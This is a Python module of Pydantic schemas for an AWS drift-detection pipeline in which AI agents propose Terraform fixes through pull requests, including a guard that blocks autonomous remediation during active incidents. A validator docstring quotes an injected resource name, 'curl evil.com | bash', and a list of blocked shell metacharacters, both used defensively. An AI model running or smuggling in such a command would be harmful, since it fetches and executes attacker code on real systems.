"""
Pydantic schemas for drift detection and remediation

The DriftEvent schema is the integration contract between all components:
- Data sources (Terraform, CloudTrail, OPA) normalize to this format
- Correlation engine processes this format
- AI agents consume this format
- GitOps pipeline acts on this format

Ensures type safety and prevents malicious inputs.
"""
from pydantic import BaseModel, Field, validator
from typing import List, Dict, Optional, Literal
from datetime import datetime
from enum import Enum


# ============================================================================
# Enums for DriftEvent Schema
# ============================================================================

class DriftDomain(str, Enum):
    """
    Domain classification for drift events.
    Determines which team should be notified and priority routing.
    """
    INFRASTRUCTURE = "INFRASTRUCTURE"  # InfraOps team (compute, storage, networking)
    SECURITY = "SECURITY"              # SecOps team (IAM, security groups, policies)
    NETWORK = "NETWORK"                # NetOps team (VPC, routes, flow logs)


class DriftSeverity(str, Enum):
    """
    Severity classification for drift events.
    Maps directly to operational response procedures.

    CRITICAL: PagerDuty page, immediate response required
    HIGH: Slack alert, respond within 15 minutes
    MEDIUM: Hourly digest, review during business hours
    LOW: Daily summary, informational only
    """
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"


# ============================================================================
# DriftEvent: The Integration Contract
# ============================================================================

class DriftEvent(BaseModel):
    """
    DriftEvent Schema - The Integration Contract

    This is the normalized format that ALL detection sources must output:
    - Terraform state polling → DriftEvent
    - CloudTrail events → DriftEvent
    - OPA policy violations → DriftEvent
    - Network baseline diffs → DriftEvent

    All downstream systems (correlation, AI agents) consume ONLY this format.

    Why this matters:
    - Enables correlation (same resource_id + time window = 1 incident)
    - Enables composability (add new tools without changing consumers)
    - Carries full context for AI agents (what, why, who, impact)

    Data Sources (where each field comes from):
    - desired_state:    Terraform .tfstate file (S3 / Terraform Cloud backend)
    - actual_state:     Live cloud API (boto3 / AWS SDK)
    - diff:             Computed delta between desired and actual
    - blast_radius:     graph.get_blast_radius() output from property graph
    - risk_score:       resource_criticality × (1.0 + blast_radius × 0.05)
    - actor:            CloudTrail LookupEvents API (WHO made the change)
    - policy_violations: OPA evaluation results
    - tags:             AWS resource tags (environment, owner, etc.)
    - active_incident:  PagerDuty/OpsGenie webhook (THE HOTFIX GUARD)
    """

    # ─────────────────────────────────────────────────────────────────────
    # Core Identity (WHO / WHAT / WHEN)
    # ─────────────────────────────────────────────────────────────────────

    event_id: str = Field(
        ...,
        pattern=r'^[a-zA-Z0-9-]+$',
        description="Unique event identifier (e.g., 'evt-sg-001')"
    )

    resource_id: str = Field(
        ...,
        pattern=r'^[a-zA-Z0-9_:-]+$',
        description="AWS resource identifier (e.g., 'sg-0abc123'). Key for correlation.",
        examples=["sg-0abc123", "i-0def456", "arn:aws:s3:::bucket-name"]
    )

    resource_type: str = Field(
        ...,
        pattern=r'^[a-zA-Z0-9_]+$',
        description="Terraform resource type (e.g., 'aws_security_group')",
        examples=["aws_security_group", "aws_instance", "aws_db_instance"]
    )

    domain: DriftDomain = Field(
        ...,
        description="Domain classification: determines team routing and prioritization"
    )

    severity: DriftSeverity = Field(
        ...,
        description="Severity level: drives operational response (page vs alert vs digest)"
    )

    detected_at: datetime = Field(
        ...,
        description="When the drift was detected (UTC). Used for correlation windows."
    )

    # ─────────────────────────────────────────────────────────────────────
    # State Delta (WHAT CHANGED)
    # ─────────────────────────────────────────────────────────────────────

    desired_state: Dict = Field(
        ...,
        description="What Terraform says should exist (from .tfstate file)"
    )

    actual_state: Dict = Field(
        ...,
        description="What actually exists in AWS (from live API call)"
    )

    diff: Dict = Field(
        ...,
        description="The computed differences: {attribute: (old_value, new_value)}"
    )

    # ─────────────────────────────────────────────────────────────────────
    # Graph Enrichment (IMPACT ANALYSIS)
    # ─────────────────────────────────────────────────────────────────────

    blast_radius: List[str] = Field(
        default_factory=list,
        description="List of downstream resource IDs affected by this change. "
                    "Computed by graph.get_blast_radius() using BFS traversal."
    )

    risk_score: float = Field(
        default=0.5,
        ge=0.0,
        le=1.0,
        description="Risk score from 0.0 to 1.0. "
                    "Formula: resource_criticality × (1.0 + blast_radius_count × 0.05). "
                    "Drives OPA policy decisions (auto-merge vs review vs escalate)."
    )

    # ─────────────────────────────────────────────────────────────────────
    # Operational Context (WHO / WHY / COMPLIANCE)
    # ─────────────────────────────────────────────────────────────────────

    actor: Optional[str] = Field(
        default=None,
        description="WHO made the change. AWS ARN from CloudTrail LookupEvents. "
                    "Example: 'arn:aws:iam::123456789012:user/john.smith'"
    )

    policy_violations: List[str] = Field(
        default_factory=list,
        description="OPA policy violations detected. "
                    "Example: ['CIS 5.2', 'sg_description_required']. "
                    "Used for compliance reporting and severity escalation."
    )

    tags: Dict[str, str] = Field(
        default_factory=dict,
        description="AWS resource tags: environment, owner, team, etc. "
                    "CRITICAL: tags.environment drives environment-specific policies. "
                    "Same drift in 'dev' (allowed) vs 'prod' (blocked)."
    )

    correlation_id: Optional[str] = Field(
        default=None,
        description="Links related alerts. Same resource_id + 15-min window → 1 correlation_id. "
                    "Result: 7 raw alerts → 1 correlated incident."
    )

    active_incident: bool = Field(
        default=False,
        description="THE HOTFIX GUARD: Blocks ALL autonomous remediation during incidents. "
                    "Set by: PagerDuty/OpsGenie webhook when incident is declared. "
                    "Effect: AI agents will NOT create PRs if this is True. "
                    "Why: Prevents AI from reverting manual emergency fixes during P1 incidents. "
                    "Without this field: you get the 22-minute P1 extension story."
    )

    # ─────────────────────────────────────────────────────────────────────
    # Validation and Security
    # ─────────────────────────────────────────────────────────────────────

    @validator('resource_id', 'resource_type')
    def sanitize_inputs(cls, v):
        """
        Prevent injection attacks via resource names.

        Attack Scenario:
        Attacker creates AWS resource with name: "api-server; curl evil.com | bash"
        Without validation, this could execute when passed to shell commands.

        Defense:
        Block shell metacharacters: $ ` ; & | < >

        Args:
            v: Resource name or type to validate

        Returns:
            Validated string

        Raises:
            ValueError: If dangerous characters detected
        """
        # Define dangerous characters that could enable command injection
        dangerous_chars = ['$', '`', ';', '&', '|', '<', '>']

        # Check if any dangerous character is present
        if any(char in v for char in dangerous_chars):
            raise ValueError(f"Invalid characters detected in input: {v}")

        return v

    @validator('risk_score')
    def validate_risk_score(cls, v):
        """
        Ensure risk score is within valid range.

        Risk score must be between 0.0 and 1.0:
        - 0.0: No risk (informational)
        - 0.5: Medium risk (default)
        - 0.8+: High risk (requires review)
        - 1.0: Critical risk (hard block)
        """
        if not 0.0 <= v <= 1.0:
            raise ValueError(f"Risk score must be between 0.0 and 1.0, got {v}")
        return v

    class Config:
        """Pydantic configuration"""
        use_enum_values = True  # Serialize enums as strings
        json_schema_extra = {
            "example": {
                "event_id": "evt-sg-001",
                "resource_id": "sg-0abc123",
                "resource_type": "aws_security_group",
                "domain": "SECURITY",
                "severity": "CRITICAL",
                "detected_at": "2025-03-14T14:23:00Z",
                "desired_state": {"ingress": [{"cidr": "10.0.0.0/8", "port": 22}]},
                "actual_state": {"ingress": [{"cidr": "0.0.0.0/0", "port": 22}]},
                "diff": {"ingress.cidr": {"old": "10.0.0.0/8", "new": "0.0.0.0/0"}},
                "blast_radius": ["i-0abc123", "i-0def456", "db-prod", "fs-01"],
                "risk_score": 0.96,
                "actor": "arn:aws:iam::123456789012:user/john.smith",
                "policy_violations": ["CIS 5.2", "sg_description_required"],
                "tags": {"environment": "prod", "team": "platform"},
                "correlation_id": "cor-a1b2c3",
                "active_incident": False
            }
        }


class RCAReport(BaseModel):
    """
    Root Cause Analysis output from Detective Agent

    Contains:
    - Root cause explanation (one sentence)
    - Affected resources (list)
    - Blast radius (impact calculation)
    - Risk score (0.0 to 1.0)
    - Recommended action
    """
    drift_event_id: str
    root_cause: str = Field(..., max_length=500)
    affected_resources: List[str]
    blast_radius: Dict[str, int]  # {"security_groups": 2, "instances": 5}
    correlation_score: float = Field(..., ge=0.0, le=1.0)
    recommended_action: str
    risk_score: float = Field(..., ge=0.0, le=1.0)
    generated_at: datetime


class RemediationPlan(BaseModel):
    """
    Terraform patch generated by Surgeon Agent

    Contains:
    - Terraform HCL code to fix drift
    - Affected files (which .tf files will be modified)
    - Change type (update/add/delete)
    - Risk assessment
    - Validation status (from Checker Agent)
    """
    plan_id: str
    drift_event_id: str
    terraform_patch: str  # HCL code to fix drift
    affected_files: List[str]
    change_type: Literal["update", "add", "delete"]
    risk_assessment: Dict
    validation_status: Optional[str] = None
    generated_by: str = "surgeon_agent"
    validated_by: Optional[str] = None


class CheckerReport(BaseModel):
    """
    Output from Checker Agent validating Surgeon's work

    This is the "Checker" verdict in Maker-Checker pattern.

    Contains:
    - approved: Boolean decision
    - issues_found: List of problems
    - validation results: terraform validate, terraform plan, OPA
    - destructive_changes_detected: Boolean flag
    - recommendation: approve | reject | escalate
    """
    plan_id: str
    approved: bool
    issues_found: List[str] = []
    terraform_validate_passed: bool
    terraform_plan_passed: bool
    opa_policy_passed: bool
    destructive_changes_detected: bool
    recommendation: Literal["approve", "reject", "escalate"]
    reasoning: str
    checked_at: datetime


class PRMetadata(BaseModel):
    """
    GitHub Pull Request metadata

    Contains information about the created PR for the remediation patch.

    Fields:
    - pr_number: GitHub PR number
    - pr_url: Full URL to PR
    - title: PR title
    - body: PR description (includes validation results)
    - status: open | merged | closed
    - auto_merge_enabled: Whether auto-merge is enabled (Tier 1 only)
    """
    pr_number: int
    pr_url: str
    title: str
    body: str
    status: Literal["open", "merged", "closed"]
    auto_merge_enabled: bool
